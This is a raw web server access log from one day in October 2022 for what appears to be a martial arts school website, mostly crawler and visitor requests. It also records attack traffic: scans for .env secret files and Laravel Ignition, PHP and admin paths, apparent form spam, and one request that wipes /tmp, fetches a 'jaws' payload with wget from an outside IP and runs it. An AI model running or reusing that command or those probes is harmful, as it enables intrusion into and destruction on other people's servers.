::ffff:147.78.47.249 - - [02/Oct/2022:10:11:28 +0000] "GET /_ignition/health-check/ HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:147.78.47.249 - - [02/Oct/2022:10:11:30 +0000] "GET /public/_ignition/health-check/ HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:147.78.47.249 - - [02/Oct/2022:10:11:32 +0000] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:95.214.235.205 - - [02/Oct/2022:10:18:43 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [02/Oct/2022:10:18:44 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.79.174 - - [02/Oct/2022:10:19:43 +0000] "GET /joinemail?type=tournaments HTTP/1.1" 200 8829 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.125 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:182.161.66.103 - - [02/Oct/2022:10:32:45 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36"
::ffff:157.55.39.21 - - [02/Oct/2022:10:39:10 +0000] "GET /images/instructors/rodnak.jpg HTTP/1.1" 200 12841 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:114.119.145.188 - - [02/Oct/2022:10:41:00 +0000] "GET /images/promotions/AFSPrelimSchedule.pdf HTTP/1.1" 200 57396 "http://34.212.47.6/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:41.46.133.127 - - [02/Oct/2022:10:45:18 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+185.216.71.192/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:46.8.23.40 - - [02/Oct/2022:10:50:40 +0000] "GET /archivarix.cms.php HTTP/1.1" 404 157 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
::ffff:135.125.246.189 - - [02/Oct/2022:10:58:15 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [02/Oct/2022:10:58:15 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:111.207.155.211 - - [02/Oct/2022:11:12:55 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"
::ffff:135.125.246.189 - - [02/Oct/2022:11:21:22 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [02/Oct/2022:11:21:23 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:114.119.152.119 - - [02/Oct/2022:11:25:21 +0000] "GET /schools HTTP/1.1" 200 97308 "http://www.wadokikai.org/contact?s=1&ss=0" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:66.249.79.176 - - [02/Oct/2022:11:52:56 +0000] "GET /instructors HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.125 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:156.146.63.136 - - [02/Oct/2022:11:57:13 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:156.146.63.136 - - [02/Oct/2022:11:57:13 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:156.146.63.136 - - [02/Oct/2022:11:57:15 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:114.119.145.193 - - [02/Oct/2022:11:59:17 +0000] "GET /joinemail?type=specialclasses HTTP/1.1" 200 8958 "http://34.212.47.6/events" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:95.214.235.205 - - [02/Oct/2022:12:10:41 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [02/Oct/2022:12:10:42 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:114.119.147.209 - - [02/Oct/2022:12:15:45 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:114.119.141.146 - - [02/Oct/2022:12:16:15 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:37.139.53.82 - - [02/Oct/2022:12:16:58 +0000] "GET / HTTP/1.0" 200 58140 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.14 Safari/537.36"
::ffff:37.139.53.82 - - [02/Oct/2022:12:16:59 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.14 Safari/537.36"
::ffff:37.139.53.82 - - [02/Oct/2022:12:16:59 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.14 Safari/537.36"
::ffff:66.249.79.182 - - [02/Oct/2022:12:35:50 +0000] "GET /contact2.html HTTP/1.1" 404 152 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.79.180 - - [02/Oct/2022:12:35:51 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:157.55.39.228 - - [02/Oct/2022:12:39:18 +0000] "GET /images/instructors/jorge8th.jpg HTTP/1.1" 200 121759 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:128.1.248.26 - - [02/Oct/2022:12:41:05 +0000] "GET /admin/ HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:207.46.13.135 - - [02/Oct/2022:12:52:28 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.127 - - [02/Oct/2022:13:04:21 +0000] "GET /images/promotions/AFSPrelimSchedule.pdf HTTP/1.1" 200 57396 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:167.248.133.46 - - [02/Oct/2022:13:17:39 +0000] "GET / HTTP/1.1" 200 58140 "-" "-"
::ffff:167.248.133.46 - - [02/Oct/2022:13:17:39 +0000] "GET / HTTP/1.1" 200 58140 "-" "-"
::ffff:167.248.133.46 - - [02/Oct/2022:13:17:39 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.248.133.46 - - [02/Oct/2022:13:17:39 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.248.133.46 - - [02/Oct/2022:13:17:39 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:167.248.133.46 - - [02/Oct/2022:13:17:39 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.248.133.46 - - [02/Oct/2022:13:17:39 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:167.248.133.46 - - [02/Oct/2022:13:17:39 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.248.133.46 - - [02/Oct/2022:13:17:40 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.248.133.46 - - [02/Oct/2022:13:17:40 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:35.160.151.195 - - [02/Oct/2022:13:20:36 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:52.43.243.132 - - [02/Oct/2022:13:20:37 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.213.211.31 - - [02/Oct/2022:13:21:12 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.213.211.31 - - [02/Oct/2022:13:21:15 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:14.116.150.68 - - [02/Oct/2022:13:26:51 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
::ffff:207.46.13.127 - - [02/Oct/2022:13:28:04 +0000] "GET /images/instructors/amastroianni.jpg HTTP/1.1" 200 78389 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:35.92.223.47 - - [02/Oct/2022:13:30:01 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.92.223.47 - - [02/Oct/2022:13:30:03 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:157.55.39.228 - - [02/Oct/2022:13:34:44 +0000] "GET /joinemail?type=specialclasses HTTP/1.1" 200 8958 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:209.97.140.107 - - [02/Oct/2022:13:35:00 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:66.249.79.187 - - [02/Oct/2022:13:35:51 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.79.187 - - [02/Oct/2022:13:35:51 +0000] "GET /contact?s=1&ss=10 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.91 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:95.214.235.205 - - [02/Oct/2022:13:38:32 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [02/Oct/2022:13:38:33 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [02/Oct/2022:13:42:17 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [02/Oct/2022:13:42:18 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.138.35.45 - - [02/Oct/2022:13:46:36 +0000] "GET / HTTP/1.1" 200 58140 "-" "-"
::ffff:35.195.93.98 - - [02/Oct/2022:13:48:03 +0000] "GET / HTTP/1.1" 200 58140 "-" "python-requests/2.28.1"
::ffff:37.139.53.82 - - [02/Oct/2022:13:56:05 +0000] "GET / HTTP/1.0" 200 58140 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.82 - - [02/Oct/2022:13:56:05 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:37.139.53.82 - - [02/Oct/2022:13:56:06 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:207.46.13.129 - - [02/Oct/2022:14:07:24 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:207.46.13.129 - - [02/Oct/2022:14:07:41 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:157.55.39.228 - - [02/Oct/2022:14:07:46 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:135.125.246.189 - - [02/Oct/2022:14:17:22 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [02/Oct/2022:14:17:22 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:136.24.141.37 - - [02/Oct/2022:14:18:04 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [02/Oct/2022:14:18:08 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:66.249.79.231 - - [02/Oct/2022:14:20:57 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.79.234 - - [02/Oct/2022:14:20:57 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.79.232 - - [02/Oct/2022:14:20:57 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:18.237.45.50 - - [02/Oct/2022:14:23:59 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:34.208.28.0 - - [02/Oct/2022:14:23:59 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.90.18.70 - - [02/Oct/2022:14:24:12 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.90.18.70 - - [02/Oct/2022:14:24:19 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:54.188.5.46 - - [02/Oct/2022:14:24:29 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:54.188.5.46 - - [02/Oct/2022:14:24:29 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:136.24.141.37 - - [02/Oct/2022:14:49:54 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:136.24.141.37 - - [02/Oct/2022:14:49:59 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "https://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:181.214.218.57 - - [02/Oct/2022:15:08:44 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 Edg/90.0.818.39"
::ffff:181.214.218.57 - - [02/Oct/2022:15:08:44 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 Edg/90.0.818.39"
::ffff:181.214.218.57 - - [02/Oct/2022:15:08:46 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 Edg/90.0.818.39"
::ffff:181.214.218.57 - - [02/Oct/2022:15:08:47 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 Edg/90.0.818.39"
::ffff:181.214.218.57 - - [02/Oct/2022:15:08:48 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 Edg/90.0.818.39"
::ffff:181.214.218.57 - - [02/Oct/2022:15:08:49 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 Edg/90.0.818.39"
::ffff:181.214.218.57 - - [02/Oct/2022:15:08:50 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 Edg/90.0.818.39"
::ffff:181.214.218.57 - - [02/Oct/2022:15:08:50 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 Edg/90.0.818.39"
::ffff:181.214.218.57 - - [02/Oct/2022:15:08:52 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 Edg/90.0.818.39"
::ffff:181.214.218.57 - - [02/Oct/2022:15:08:53 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 Edg/90.0.818.39"
::ffff:31.133.0.182 - - [02/Oct/2022:15:25:51 +0000] "GET /images/PromoMay2021-GroupPic.jpg HTTP/1.1" 404 171 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
::ffff:185.220.101.3 - - [02/Oct/2022:15:25:58 +0000] "GET /images/BayFarmSep06.jpg HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
::ffff:185.112.146.73 - - [02/Oct/2022:15:26:05 +0000] "GET /images/HarborBay.jpg HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
::ffff:185.220.101.35 - - [02/Oct/2022:15:26:13 +0000] "GET /images/virtual.jpg HTTP/1.1" 404 157 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
::ffff:185.220.100.245 - - [02/Oct/2022:15:38:31 +0000] "GET /images/PromoMay2021-GroupPic.jpg HTTP/1.1" 404 171 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
::ffff:198.98.57.207 - - [02/Oct/2022:15:38:33 +0000] "GET /images/BayFarmSep06.jpg HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
::ffff:37.252.255.135 - - [02/Oct/2022:15:38:33 +0000] "GET /images/virtual.jpg HTTP/1.1" 404 157 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
::ffff:167.99.214.205 - - [02/Oct/2022:15:38:56 +0000] "GET /images/HarborBay.jpg HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
::ffff:88.214.43.118 - - [02/Oct/2022:15:50:11 +0000] "GET /phpinfi.php HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:88.214.43.118 - - [02/Oct/2022:15:50:11 +0000] "GET /phpinfi.php HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:142.44.170.136 - - [02/Oct/2022:15:51:31 +0000] "GET /images/virtual.jpg HTTP/1.1" 404 157 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
::ffff:142.44.170.136 - - [02/Oct/2022:15:51:31 +0000] "GET /images/PromoMay2021-GroupPic.jpg HTTP/1.1" 404 171 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
::ffff:185.220.100.255 - - [02/Oct/2022:15:51:37 +0000] "GET /images/HarborBay.jpg HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
